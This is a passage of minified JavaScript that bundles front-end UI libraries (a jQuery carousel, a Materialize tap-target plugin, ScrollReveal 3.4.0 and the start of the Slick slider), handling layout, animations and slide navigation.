            prev: function(t, i) {
                e(this).trigger("carouselPrev", [t, i])
            },
            set: function(t, i) {
                e(this).trigger("carouselSet", [t, i])
            },
            destroy: function() {
                var t = e(this).attr("data-namespace");
                e(this).removeAttr("data-namespace"), e(this).removeClass("initialized"), e(this).find(".indicators").remove(), e(this).off("carouselNext carouselPrev carouselSet"), e(window).off("resize.carousel-" + t), void 0 !== window.ontouchstart && e(this).off("touchstart.carousel touchmove.carousel touchend.carousel"), e(this).off("mousedown.carousel mousemove.carousel mouseup.carousel mouseleave.carousel click.carousel")
            }
        };
        e.fn.carousel = function(i) {
            return t[i] ? t[i].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof i && i ? void e.error("Method " + i + " does not exist on jQuery.carousel") : t.init.apply(this, arguments)
        }
    }(jQuery),
    function(e) {
        var t = {
            init: function(t) {
                return this.each((function() {
                    var i = e("#" + e(this).attr("data-activates")),
                        n = (e("body"), e(this)),
                        o = n.parent(".tap-target-wrapper"),
                        r = o.find(".tap-target-wave"),
                        s = o.find(".tap-target-origin"),
                        a = n.find(".tap-target-content");
                    o.length || (o = n.wrap(e('<div class="tap-target-wrapper"></div>')).parent()), a.length || (a = e('<div class="tap-target-content"></div>'), n.append(a)), r.length || (r = e('<div class="tap-target-wave"></div>'), s.length || ((s = i.clone(!0, !0)).addClass("tap-target-origin"), s.removeAttr("id"), s.removeAttr("style"), r.append(s)), o.append(r));
                    var l = function() {
                            o.is(".open") && (o.removeClass("open"), s.off("click.tapTarget"), e(document).off("click.tapTarget"), e(window).off("resize.tapTarget"))
                        },
                        c = function() {
                            var t = "fixed" === i.css("position");
                            if (!t)
                                for (var s = i.parents(), l = 0; l < s.length && !(t = "fixed" == e(s[l]).css("position")); l++);
                            var c = i.outerWidth(),
                                u = i.outerHeight(),
                                d = t ? i.offset().top - e(document).scrollTop() : i.offset().top,
                                p = t ? i.offset().left - e(document).scrollLeft() : i.offset().left,
                                f = e(window).width(),
                                h = e(window).height(),
                                v = f / 2,
                                g = h / 2,
                                m = p <= v,
                                y = p > v,
                                b = d <= g,
                                w = d > g,
                                x = p >= .25 * f && p <= .75 * f,
                                k = n.outerWidth(),
                                C = n.outerHeight(),
                                T = d + u / 2 - C / 2,
                                S = p + c / 2 - k / 2,
                                A = t ? "fixed" : "absolute",
                                $ = x ? k : k / 2 + c,
                                E = C / 2,
                                P = b ? C / 2 : 0,
                                O = m && !x ? k / 2 - c : 0,
                                D = c,
                                M = w ? "bottom" : "top",
                                j = 2 * c,
                                q = j,
                                L = C / 2 - q / 2,
                                H = k / 2 - j / 2,
                                N = {};
                            N.top = b ? T : "", N.right = y ? f - S - k : "", N.bottom = w ? h - T - C : "", N.left = m ? S : "", N.position = A, o.css(N), a.css({
                                width: $,
                                height: E,
                                top: P,
                                right: 0,
                                bottom: 0,
                                left: O,
                                padding: D,
                                verticalAlign: M
                            }), r.css({
                                top: L,
                                left: H,
                                width: j,
                                height: q
                            })
                        };
                    "open" == t && (c(), o.is(".open") || (o.addClass("open"), setTimeout((function() {
                        s.off("click.tapTarget").on("click.tapTarget", (function(e) {
                            l(), s.off("click.tapTarget")
                        })), e(document).off("click.tapTarget").on("click.tapTarget", (function(t) {
                            l(), e(document).off("click.tapTarget")
                        }));
                        var t = Materialize.throttle((function() {
                            c()
                        }), 200);
                        e(window).off("resize.tapTarget").on("resize.tapTarget", t)
                    }), 0))), "close" == t && l()
                }))
            },
            open: function() {},
            close: function() {}
        };
        e.fn.tapTarget = function(i) {
            if (t[i] || "object" == typeof i) return t.init.apply(this, arguments);
            e.error("Method " + i + " does not exist on jQuery.tap-target")
        }
    }(jQuery),
    function() {
        "use strict";

        function e(i) {
            return void 0 === this || Object.getPrototypeOf(this) !== e.prototype ? new e(i) : ((v = this).version = "3.4.0", v.tools = new h, v.isSupported() ? (v.tools.extend(v.defaults, i || {}), v.defaults.container = t(v.defaults), v.store = {
                elements: {},
                containers: []
            }, v.sequences = {}, v.history = [], v.uid = 0, v.initialized = !1) : "undefined" != typeof console && console, v)
        }

        function t(e) {
            if (e && e.container) {
                if ("string" == typeof e.container) return window.document.documentElement.querySelector(e.container);
                if (v.tools.isNode(e.container)) return e.container
            }
            return v.defaults.container
        }

        function i() {
            return ++v.uid
        }

        function n(e, t, i) {
            t.container && (t.container = i), e.config ? e.config = v.tools.extendClone(e.config, t) : e.config = v.tools.extendClone(v.defaults, t), "top" === e.config.origin || "bottom" === e.config.origin ? e.config.axis = "Y" : e.config.axis = "X"
        }

        function o(e) {
            var t = window.getComputedStyle(e.domEl);
            e.styles || (e.styles = {
                transition: {},
                transform: {},
                computed: {}
            }, e.styles.inline = e.domEl.getAttribute("style") || "", e.styles.inline += "; visibility: visible; ", e.styles.computed.opacity = t.opacity, t.transition && "all 0s ease 0s" !== t.transition ? e.styles.computed.transition = t.transition + ", " : e.styles.computed.transition = ""), e.styles.transition.instant = r(e, 0), e.styles.transition.delayed = r(e, e.config.delay), e.styles.transform.initial = " -webkit-transform:", e.styles.transform.target = " -webkit-transform:", s(e), e.styles.transform.initial += "transform:", e.styles.transform.target += "transform:", s(e)
        }

        function r(e, t) {
            var i = e.config;
            return "-webkit-transition: " + e.styles.computed.transition + "-webkit-transform " + i.duration / 1e3 + "s " + i.easing + " " + t / 1e3 + "s, opacity " + i.duration / 1e3 + "s " + i.easing + " " + t / 1e3 + "s; transition: " + e.styles.computed.transition + "transform " + i.duration / 1e3 + "s " + i.easing + " " + t / 1e3 + "s, opacity " + i.duration / 1e3 + "s " + i.easing + " " + t / 1e3 + "s; "
        }

        function s(e) {
            var t, i = e.config,
                n = e.styles.transform;
            t = "top" === i.origin || "left" === i.origin ? /^-/.test(i.distance) ? i.distance.substr(1) : "-" + i.distance : i.distance, parseInt(i.distance) && (n.initial += " translate" + i.axis + "(" + t + ")", n.target += " translate" + i.axis + "(0)"), i.scale && (n.initial += " scale(" + i.scale + ")", n.target += " scale(1)"), i.rotate.x && (n.initial += " rotateX(" + i.rotate.x + "deg)", n.target += " rotateX(0)"), i.rotate.y && (n.initial += " rotateY(" + i.rotate.y + "deg)", n.target += " rotateY(0)"), i.rotate.z && (n.initial += " rotateZ(" + i.rotate.z + "deg)", n.target += " rotateZ(0)"), n.initial += "; opacity: " + i.opacity + ";", n.target += "; opacity: " + e.styles.computed.opacity + ";"
        }

        function a(e) {
            var t = e.config.container;
            t && -1 === v.store.containers.indexOf(t) && v.store.containers.push(e.config.container), v.store.elements[e.id] = e
        }

        function l() {
            if (v.isSupported()) {
                u();
                for (var e = 0; e < v.store.containers.length; e++) v.store.containers[e].addEventListener("scroll", c), v.store.containers[e].addEventListener("resize", c);
                v.initialized || (window.addEventListener("scroll", c), window.addEventListener("resize", c), v.initialized = !0)
            }
            return v
        }

        function c() {
            g(u)
        }

        function u() {
            var e, t;
            (function() {
                var e, t, i;
                v.tools.forOwn(v.sequences, (function(n) {
                    i = v.sequences[n], e = !1;
                    for (var o = 0; o < i.elemIds.length; o++) t = i.elemIds[o], f(v.store.elements[t]) && !e && (e = !0);
                    i.active = e
                }))
            })(), v.tools.forOwn(v.store.elements, (function(i) {
                t = v.store.elements[i], e = function(e) {
                        var t = e.config.useDelay;
                        return "always" === t || "onload" === t && !v.initialized || "once" === t && !e.seen
                    }(t),
                    function(e) {
                        if (e.sequence) {
                            var t = v.sequences[e.sequence.id];
                            return t.active && !t.blocked && !e.revealing && !e.disabled
                        }
                        return f(e) && !e.revealing && !e.disabled
                    }(t) ? (t.config.beforeReveal(t.domEl), e ? t.domEl.setAttribute("style", t.styles.inline + t.styles.transform.target + t.styles.transition.delayed) : t.domEl.setAttribute("style", t.styles.inline + t.styles.transform.target + t.styles.transition.instant), d("reveal", t, e), t.revealing = !0, t.seen = !0, t.sequence && function(e, t) {
                        var i = 0,
                            n = 0,
                            o = v.sequences[e.sequence.id];
                        o.blocked = !0, t && "onload" === e.config.useDelay && (n = e.config.delay), e.sequence.timer && (i = Math.abs(e.sequence.timer.started - new Date), window.clearTimeout(e.sequence.timer)), e.sequence.timer = {
                            started: new Date
                        }, e.sequence.timer.clock = window.setTimeout((function() {
                            o.blocked = !1, e.sequence.timer = null, c()
                        }), Math.abs(o.interval) + n - i)
                    }(t, e)) : function(e) {
                        return e.sequence ? !v.sequences[e.sequence.id].active && e.config.reset && e.revealing && !e.disabled : !f(e) && e.config.reset && e.revealing && !e.disabled
                    }(t) && (t.config.beforeReset(t.domEl), t.domEl.setAttribute("style", t.styles.inline + t.styles.transform.initial + t.styles.transition.instant), d("reset", t), t.revealing = !1)
            }))
        }

        function d(e, t, i) {
            var n = 0,
                o = 0,
                r = "after";
            switch (e) {
                case "reveal":
                    o = t.config.duration, i && (o += t.config.delay), r += "Reveal";
                    break;
                case "reset":
                    o = t.config.duration, r += "Reset"
            }
            t.timer && (n = Math.abs(t.timer.started - new Date), window.clearTimeout(t.timer.clock)), t.timer = {
                started: new Date
            }, t.timer.clock = window.setTimeout((function() {
                t.config[r](t.domEl), t.timer = null
            }), o - n)
        }

        function p(e) {
            var t = 0,
                i = 0,
                n = e.offsetHeight,
                o = e.offsetWidth;
            do {
                isNaN(e.offsetTop) || (t += e.offsetTop), isNaN(e.offsetLeft) || (i += e.offsetLeft), e = e.offsetParent
            } while (e);
            return {
                top: t,
                left: i,
                height: n,
                width: o
            }
        }

        function f(e) {
            var t = p(e.domEl),
                i = function(e) {
                    return {
                        width: e.clientWidth,
                        height: e.clientHeight
                    }
                }(e.config.container),
                n = function(e) {
                    if (e && e !== window.document.documentElement) {
                        var t = p(e);
                        return {
                            x: e.scrollLeft + t.left,
                            y: e.scrollTop + t.top
                        }
                    }
                    return {
                        x: window.pageXOffset,
                        y: window.pageYOffset
                    }
                }(e.config.container),
                o = e.config.viewFactor,
                r = t.height,
                s = t.width,
                a = t.top,
                l = t.left,
                c = a + r,
                u = l + s;
            return function() {
                var t = a + r * o,
                    d = l + s * o,
                    p = c - r * o,
                    f = u - s * o,
                    h = n.y + e.config.viewOffset.top,
                    v = n.x + e.config.viewOffset.left,
                    g = n.y - e.config.viewOffset.bottom + i.height,
                    m = n.x - e.config.viewOffset.right + i.width;
                return t < g && p > h && d < m && f > v
            }() || "fixed" === window.getComputedStyle(e.domEl).position
        }

        function h() {}
        var v, g;
        e.prototype.defaults = {
            origin: "bottom",
            distance: "20px",
            duration: 500,
            delay: 0,
            rotate: {
                x: 0,
                y: 0,
                z: 0
            },
            opacity: 0,
            scale: .9,
            easing: "cubic-bezier(0.6, 0.2, 0.1, 1)",
            container: window.document.documentElement,
            mobile: !0,
            reset: !1,
            useDelay: "always",
            viewFactor: .2,
            viewOffset: {
                top: 0,
                right: 0,
                bottom: 0,
                left: 0
            },
            beforeReveal: function(e) {},
            beforeReset: function(e) {},
            afterReveal: function(e) {},
            afterReset: function(e) {}
        }, e.prototype.isSupported = function() {
            var e = document.documentElement.style;
            return "WebkitTransition" in e && "WebkitTransform" in e || "transition" in e && "transform" in e
        }, e.prototype.reveal = function(e, r, s, c) {
            var u, d, p, f, h, g;
            if (void 0 !== r && "number" == typeof r ? (s = r, r = {}) : null != r || (r = {}), d = function(e, t) {
                    return "string" == typeof e ? Array.prototype.slice.call(t.querySelectorAll(e)) : v.tools.isNode(e) ? [e] : v.tools.isNodeList(e) ? Array.prototype.slice.call(e) : Array.isArray(e) ? e.filter(v.tools.isNode) : []
                }(e, u = t(r)), !d.length) return v;
            s && "number" == typeof s && (g = i(), h = v.sequences[g] = {
                id: g,
                interval: s,
                elemIds: [],
                active: !1
            });
            for (var m = 0; m < d.length; m++)(f = d[m].getAttribute("data-sr-id")) ? p = v.store.elements[f] : (p = {
                id: i(),
                domEl: d[m],
                seen: !1,
                revealing: !1
            }).domEl.setAttribute("data-sr-id", p.id), h && (p.sequence = {
                id: h.id,
                index: h.elemIds.length
            }, h.elemIds.push(p.id)), n(p, r, u), o(p), a(p), v.tools.isMobile() && !p.config.mobile || !v.isSupported() ? (p.domEl.setAttribute("style", p.styles.inline), p.disabled = !0) : p.revealing || p.domEl.setAttribute("style", p.styles.inline + p.styles.transform.initial);
            return !c && v.isSupported() && (function(e, t, i) {
                var n = {
                    target: e,
                    config: t,
                    interval: i
                };
                v.history.push(n)
            }(e, r, s), v.initTimeout && window.clearTimeout(v.initTimeout), v.initTimeout = window.setTimeout(l, 0)), v
        }, e.prototype.sync = function() {
            if (v.history.length && v.isSupported()) {
                for (var e = 0; e < v.history.length; e++) {
                    var t = v.history[e];
                    v.reveal(t.target, t.config, t.interval, !0)
                }
                l()
            }
            return v
        }, h.prototype.isObject = function(e) {
            return null !== e && "object" == typeof e && e.constructor === Object
        }, h.prototype.isNode = function(e) {
            return "object" == typeof window.Node ? e instanceof window.Node : e && "object" == typeof e && "number" == typeof e.nodeType && "string" == typeof e.nodeName
        }, h.prototype.isNodeList = function(e) {
            var t = Object.prototype.toString.call(e);
            return "object" == typeof window.NodeList ? e instanceof window.NodeList : e && "object" == typeof e && /^\[object (HTMLCollection|NodeList|Object)\]$/.test(t) && "number" == typeof e.length && (0 === e.length || this.isNode(e[0]))
        }, h.prototype.forOwn = function(e, t) {
            if (!this.isObject(e)) throw new TypeError('Expected "object", but received "' + typeof e + '".');
            for (var i in e) e.hasOwnProperty(i) && t(i)
        }, h.prototype.extend = function(e, t) {
            return this.forOwn(t, function(i) {
                this.isObject(t[i]) ? (e[i] && this.isObject(e[i]) || (e[i] = {}), this.extend(e[i], t[i])) : e[i] = t[i]
            }.bind(this)), e
        }, h.prototype.extendClone = function(e, t) {
            return this.extend(this.extend({}, e), t)
        }, h.prototype.isMobile = function() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
        }, g = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function(e) {
            window.setTimeout(e, 1e3 / 60)
        }, "function" == typeof define && "object" == typeof define.amd && define.amd ? define((function() {
            return e
        })) : "undefined" != typeof module && module.exports ? module.exports = e : window.ScrollReveal = e
    }(),
    function(e) {
        "use strict";
        "function" == typeof define && define.amd ? define(["jquery"], e) : "undefined" != typeof exports ? module.exports = e(require("jquery")) : e(jQuery)
    }((function(e) {
        "use strict";
        var t = window.Slick || {};
        (t = function() {
            var t = 0;
            return function(i, n) {
                var o, r = this;
                r.defaults = {
                    accessibility: !0,
                    adaptiveHeight: !1,
                    appendArrows: e(i),
                    appendDots: e(i),
                    arrows: !0,
                    asNavFor: null,
                    prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
                    nextArrow: '<button class="slick-next" aria-label="Next" type="button">Next</button>',
                    autoplay: !1,
                    autoplaySpeed: 3e3,
                    centerMode: !1,
                    centerPadding: "50px",
                    cssEase: "ease",
                    customPaging: function(t, i) {
                        return e('<button type="button" />').text(i + 1)
                    },
                    dots: !1,
                    dotsClass: "slick-dots",
                    draggable: !0,
                    easing: "linear",
                    edgeFriction: .35,
                    fade: !1,
                    focusOnSelect: !1,
                    focusOnChange: !1,
                    infinite: !0,
                    initialSlide: 0,
                    lazyLoad: "ondemand",
                    mobileFirst: !1,
                    pauseOnHover: !0,
                    pauseOnFocus: !0,
                    pauseOnDotsHover: !1,
                    respondTo: "window",
                    responsive: null,
                    rows: 1,
                    rtl: !1,
                    slide: "",
                    slidesPerRow: 1,
                    slidesToShow: 1,
                    slidesToScroll: 1,
                    speed: 500,
                    swipe: !0,
                    swipeToSlide: !1,
                    touchMove: !0,
                    touchThreshold: 5,
                    useCSS: !0,
                    useTransform: !0,
                    variableWidth: !1,
                    vertical: !1,
                    verticalSwiping: !1,
                    waitForAnimate: !0,
                    zIndex: 1e3
                }, r.initials = {
                    animating: !1,
                    dragging: !1,
                    autoPlayTimer: null,
                    currentDirection: 0,
                    currentLeft: null,
                    currentSlide: 0,
                    direction: 1,
                    $dots: null,
                    listWidth: null,
                    listHeight: null,
                    loadIndex: 0,
                    $nextArrow: null,
                    $prevArrow: null,
                    scrolling: !1,
                    slideCount: null,
                    slideWidth: null,
                    $slideTrack: null,
                    $slides: null,
                    sliding: !1,
                    slideOffset: 0,
                    swipeLeft: null,
                    swiping: !1,
                    $list: null,
                    touchObject: {},
                    transformsEnabled: !1,
                    unslicked: !1
                }, e.extend(r, r.initials), r.activeBreakpoint = null, r.animType = null, r.animProp = null, r.breakpoints = [], r.breakpointSettings = [], r.cssTransitions = !1, r.focussed = !1, r.interrupted = !1, r.hidden = "hidden", r.paused = !0, r.positionProp = null, r.respondTo = null, r.rowCount = 1, r.shouldClick = !0, r.$slider = e(i), r.$slidesCache = null, r.transformType = null, r.transitionType = null, r.visibilityChange = "visibilitychange", r.windowWidth = 0, r.windowTimer = null, o = e(i).data("slick") || {}, r.options = e.extend({}, r.defaults, n, o), r.currentSlide = r.options.initialSlide, r.originalSettings = r.options, void 0 !== document.mozHidden ? (r.hidden = "mozHidden", r.visibilityChange = "mozvisibilitychange") : void 0 !== document.webkitHidden && (r.hidden = "webkitHidden", r.visibilityChange = "webkitvisibilitychange"), r.autoPlay = e.proxy(r.autoPlay, r), r.autoPlayClear = e.proxy(r.autoPlayClear, r), r.autoPlayIterator = e.proxy(r.autoPlayIterator, r), r.changeSlide = e.proxy(r.changeSlide, r), r.clickHandler = e.proxy(r.clickHandler, r), r.selectHandler = e.proxy(r.selectHandler, r), r.setPosition = e.proxy(r.setPosition, r), r.swipeHandler = e.proxy(r.swipeHandler, r), r.dragHandler = e.proxy(r.dragHandler, r), r.keyHandler = e.proxy(r.keyHandler, r), r.instanceUid = t++, r.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/, r.registerBreakpoints(), r.init(!0)
            }
        }()).prototype.activateADA = function() {
            this.$slideTrack.find(".slick-active").attr({
                "aria-hidden": "false"
            }).find("a, input, button, select").attr({
                tabindex: "0"
            })
        }, t.prototype.addSlide = t.prototype.slickAdd = function(t, i, n) {
            var o = this;
            if ("boolean" == typeof i) n = i, i = null;
            else if (i < 0 || i >= o.slideCount) return !1;
            o.unload(), "number" == typeof i ? 0 === i && 0 === o.$slides.length ? e(t).appendTo(o.$slideTrack) : n ? e(t).insertBefore(o.$slides.eq(i)) : e(t).insertAfter(o.$slides.eq(i)) : !0 === n ? e(t).prependTo(o.$slideTrack) : e(t).appendTo(o.$slideTrack), o.$slides = o.$slideTrack.children(this.options.slide), o.$slideTrack.children(this.options.slide).detach(), o.$slideTrack.append(o.$slides), o.$slides.each((function(t, i) {
                e(i).attr("data-slick-index", t)
            })), o.$slidesCache = o.$slides, o.reinit()
        }, t.prototype.animateHeight = function() {
            var e = this;
            if (1 === e.options.slidesToShow && !0 === e.options.adaptiveHeight && !1 === e.options.vertical) {
                var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
                e.$list.animate({
                    height: t
                }, e.options.speed)
            }
        }, t.prototype.animateSlide = function(t, i) {
            var n = {},
                o = this;
            o.animateHeight(), !0 === o.options.rtl && !1 === o.options.vertical && (t = -t), !1 === o.transformsEnabled ? !1 === o.options.vertical ? o.$slideTrack.animate({
                left: t
            }, o.options.speed, o.options.easing, i) : o.$slideTrack.animate({
                top: t
            }, o.options.speed, o.options.easing, i) : !1 === o.cssTransitions ? (!0 === o.options.rtl && (o.currentLeft = -o.currentLeft), e({
                animStart: o.currentLeft
            }).animate({
                animStart: t
            }, {
                duration: o.options.speed,
                easing: o.options.easing,
                step: function(e) {
                    e = Math.ceil(e), !1 === o.options.vertical ? (n[o.animType] = "translate(" + e + "px, 0px)", o.$slideTrack.css(n)) : (n[o.animType] = "translate(0px," + e + "px)", o.$slideTrack.css(n))
                },
                complete: function() {
                    i && i.call()
                }
            })) : (o.applyTransition(), t = Math.ceil(t), !1 === o.options.vertical ? n[o.animType] = "translate3d(" + t + "px, 0px, 0px)" : n[o.animType] = "translate3d(0px," + t + "px, 0px)", o.$slideTrack.css(n), i && setTimeout((function() {
                o.disableTransition(), i.call()
            }), o.options.speed))
        }, t.prototype.getNavTarget = function() {
            var t = this.options.asNavFor;
            return t && null !== t && (t = e(t).not(this.$slider)), t
        }, t.prototype.asNavFor = function(t) {
            var i = this.getNavTarget();
            null !== i && "object" == typeof i && i.each((function() {
                var i = e(this).slick("getSlick");
                i.unslicked || i.slideHandler(t, !0)
            }))
        }, t.prototype.applyTransition = function(e) {
            var t = this,
                i = {};
            !1 === t.options.fade ? i[t.transitionType] = t.transformType + " " + t.options.speed + "ms " + t.options.cssEase : i[t.transitionType] = "opacity " + t.options.speed + "ms " + t.options.cssEase, !1 === t.options.fade ? t.$slideTrack.css(i) : t.$slides.eq(e).css(i)
        }, t.prototype.autoPlay = function() {
            var e = this;
            e.autoPlayClear(), e.slideCount > e.options.slidesToShow && (e.autoPlayTimer = setInterval(e.autoPlayIterator, e.options.autoplaySpeed))
        }, t.prototype.autoPlayClear = function() {
            this.autoPlayTimer && clearInterval(this.autoPlayTimer)
        }, t.prototype.autoPlayIterator = function() {
            var e = this,
                t = e.currentSlide + e.options.slidesToScroll;
            e.paused || e.interrupted || e.focussed || (!1 === e.options.infinite && (1 === e.direction && e.currentSlide + 1 === e.slideCount - 1 ? e.direction = 0 : 0 === e.direction && (t = e.currentSlide - e.options.slidesToScroll, e.currentSlide - 1 == 0 && (e.direction = 1))), e.slideHandler(t))
        }, t.prototype.buildArrows = function() {
            var t = this;
            !0 === t.options.arrows && (t.$prevArrow = e(t.options.prevArrow).addClass("slick-arrow"), t.$nextArrow = e(t.options.nextArrow).addClass("slick-arrow"), t.slideCount > t.options.slidesToShow ? (t.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), t.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.prependTo(t.options.appendArrows), t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.appendTo(t.options.appendArrows), !0 !== t.options.infinite && t.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : t.$prevArrow.add(t.$nextArrow).addClass("slick-hidden").attr({
                "aria-disabled": "true",
                tabindex: "-1"
            }))
        }, t.prototype.buildDots = function() {
            var t, i, n = this;
            if (!0 === n.options.dots) {
                for (n.$slider.addClass("slick-dotted"), i = e("<ul />").addClass(n.options.dotsClass), t = 0; t <= n.getDotCount(); t += 1) i.append(e("<li />").append(n.options.customPaging.call(this, n, t)));
                n.$dots = i.appendTo(n.options.appendDots), n.$dots.find("li").first().addClass("slick-active")
            }
        }, t.prototype.buildOut = function() {
            var t = this;
            t.$slides = t.$slider.children(t.options.slide + ":not(.slick-cloned)").addClass("slick-slide"), t.slideCount = t.$slides.length, t.$slides.each((function(t, i) {
                e(i).attr("data-slick-index", t).data("originalStyling", e(i).attr("style") || "")
            })), t.$slider.addClass("slick-slider"), t.$slideTrack = 0 === t.slideCount ? e('<div class="slick-track"/>').appendTo(t.$slider) : t.$slides.wrapAll('<div class="slick-track"/>').parent(), t.$list = t.$slideTrack.wrap('<div class="slick-list"/>').parent(), t.$slideTrack.css("opacity", 0), !0 !== t.options.centerMode && !0 !== t.options.swipeToSlide || (t.options.slidesToScroll = 1), e("img[data-lazy]", t.$slider).not("[src]").addClass("slick-loading"), t.setupInfinite(), t.buildArrows(), t.buildDots(), t.updateDots(), t.setSlideClasses("number" == typeof t.currentSlide ? t.currentSlide : 0), !0 === t.options.draggable && t.$list.addClass("draggable")
        }, t.prototype.buildRows = function() {
            var e, t, i, n, o, r, s, a = this;
            if (n = document.createDocumentFragment(), r = a.$slider.children(), a.options.rows > 1) {
                for (s = a.options.slidesPerRow * a.options.rows, o = Math.ceil(r.length / s), e = 0; e < o; e++) {
                    var l = document.createElement("div");
                    for (t = 0; t < a.options.rows; t++) {
                        var c = document.createElement("div");
                        for (i = 0; i < a.options.slidesPerRow; i++) {
                            var u = e * s + (t * a.options.slidesPerRow + i);
                            r.get(u) && c.appendChild(r.get(u))
                        }
                        l.appendChild(c)
                    }
                    n.appendChild(l)
                }
                a.$slider.empty().append(n), a.$slider.children().children().children().css({
                    width: 100 / a.options.slidesPerRow + "%",
                    display: "inline-block"
                })
            }
        }, t.prototype.checkResponsive = function(t, i) {
            var n, o, r, s = this,
                a = !1,
                l = s.$slider.width(),
                c = window.innerWidth || e(window).width();
            if ("window" === s.respondTo ? r = c : "slider" === s.respondTo ? r = l : "min" === s.respondTo && (r = Math.min(c, l)), s.options.responsive && s.options.responsive.length && null !== s.options.responsive) {
                for (n in o = null, s.breakpoints) s.breakpoints.hasOwnProperty(n) && (!1 === s.originalSettings.mobileFirst ? r < s.breakpoints[n] && (o = s.breakpoints[n]) : r > s.breakpoints[n] && (o = s.breakpoints[n]));
                null !== o ? null !== s.activeBreakpoint ? (o !== s.activeBreakpoint || i) && (s.activeBreakpoint = o, "unslick" === s.breakpointSettings[o] ? s.unslick(o) : (s.options = e.extend({}, s.originalSettings, s.breakpointSettings[o]), !0 === t && (s.currentSlide = s.options.initialSlide), s.refresh(t)), a = o) : (s.activeBreakpoint = o, "unslick" === s.breakpointSettings[o] ? s.unslick(o) : (s.options = e.extend({}, s.originalSettings, s.breakpointSettings[o]), !0 === t && (s.currentSlide = s.options.initialSlide), s.refresh(t)), a = o) : null !== s.activeBreakpoint && (s.activeBreakpoint = null, s.options = s.originalSettings, !0 === t && (s.currentSlide = s.options.initialSlide), s.refresh(t), a = o), t || !1 === a || s.$slider.trigger("breakpoint", [s, a])
            }
        }, t.prototype.changeSlide = function(t, i) {
            var n, o, r = this,
                s = e(t.currentTarget);
            switch (s.is("a") && t.preventDefault(), s.is("li") || (s = s.closest("li")), n = r.slideCount % r.options.slidesToScroll != 0 ? 0 : (r.slideCount - r.currentSlide) % r.options.slidesToScroll, t.data.message) {
                case "previous":
                    o = 0 === n ? r.options.slidesToScroll : r.options.slidesToShow - n, r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide - o, !1, i);
                    break;
                case "next":
                    o = 0 === n ? r.options.slidesToScroll : n, r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide + o, !1, i);
                    break;
                case "index":
                    var a = 0 === t.data.index ? 0 : t.data.index || s.index() * r.options.slidesToScroll;
                    r.slideHandler(r.checkNavigable(a), !1, i), s.children().trigger("focus");
                    break;
                default:
                    return
            }
        }, t.prototype.checkNavigable = function(e) {
            var t, i;
            if (i = 0, e > (t = this.getNavigableIndexes())[t.length - 1]) e = t[t.length - 1];
            else
                for (var n in t) {
                    if (e < t[n]) {
                        e = i;
                        break
                    }
                    i = t[n]
                }
            return e
        }, t.prototype.cleanUpEvents = function() {
            var t = this;
            t.options.dots && null !== t.$dots && (e("li", t.$dots).off("click.slick", t.changeSlide).off("mouseenter.slick", e.proxy(t.interrupt, t, !0)).off("mouseleave.slick", e.proxy(t.interrupt, t, !1)), !0 === t.options.accessibility && t.$dots.off("keydown.slick", t.keyHandler)), t.$slider.off("focus.slick blur.slick"), !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow && t.$prevArrow.off("click.slick", t.changeSlide), t.$nextArrow && t.$nextArrow.off("click.slick", t.changeSlide), !0 === t.options.accessibility && (t.$prevArrow && t.$prevArrow.off("keydown.slick", t.keyHandler), t.$nextArrow && t.$nextArrow.off("keydown.slick", t.keyHandler))), t.$list.off("touchstart.slick mousedown.slick", t.swipeHandler), t.$list.off("touchmove.slick mousemove.slick", t.swipeHandler), t.$list.off("touchend.slick mouseup.slick", t.swipeHandler), t.$list.off("touchcancel.slick mouseleave.slick", t.swipeHandler), t.$list.off("click.slick", t.clickHandler), e(document).off(t.visibilityChange, t.visibility), t.cleanUpSlideEvents(), !0 === t.options.accessibility && t.$list.off("keydown.slick", t.keyHandler), !0 === t.options.focusOnSelect && e(t.$slideTrack).children().off("click.slick", t.selectHandler), e(window).off("orientationchange.slick.slick-" + t.instanceUid, t.orientationChange), e(window).off("resize.slick.slick-" + t.instanceUid, t.resize), e("[draggable!=true]", t.$slideTrack).off("dragstart", t.preventDefault), e(window).off("load.slick.slick-" + t.instanceUid, t.setPosition)
        }, t.prototype.cleanUpSlideEvents = function() {
            var t = this;
            t.$list.off("mouseenter.slick", e.proxy(t.interrupt, t, !0)), t.$list.off("mouseleave.slick", e.proxy(t.interrupt, t, !1))
        }, t.prototype.cleanUpRows = function() {
            var e, t = this;
            t.options.rows > 1 && ((e = t.$slides.children().children()).removeAttr("style"), t.$slider.empty().append(e))
        }, t.prototype.clickHandler = function(e) {
            !1 === this.shouldClick && (e.stopImmediatePropagation(), e.stopPropagation(), e.preventDefault())
        }, t.prototype.destroy = function(t) {
            var i = this;
            i.autoPlayClear(), i.touchObject = {}, i.cleanUpEvents(), e(".slick-cloned", i.$slider).detach(), i.$dots && i.$dots.remove(), i.$prevArrow && i.$prevArrow.length && (i.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.prevArrow) && i.$prevArrow.remove()), i.$nextArrow && i.$nextArrow.length && (i.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.nextArrow) && i.$nextArrow.remove()), i.$slides && (i.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each((function() {
                e(this).attr("style", e(this).data("originalStyling"))
            })), i.$slideTrack.children(this.options.slide).detach(), i.$slideTrack.detach(), i.$list.detach(), i.$slider.append(i.$slides)), i.cleanUpRows(), i.$slider.removeClass("slick-slider"), i.$slider.removeClass("slick-initialized"), i.$slider.removeClass("slick-dotted"), i.unslicked = !0, t || i.$slider.trigger("destroy", [i])
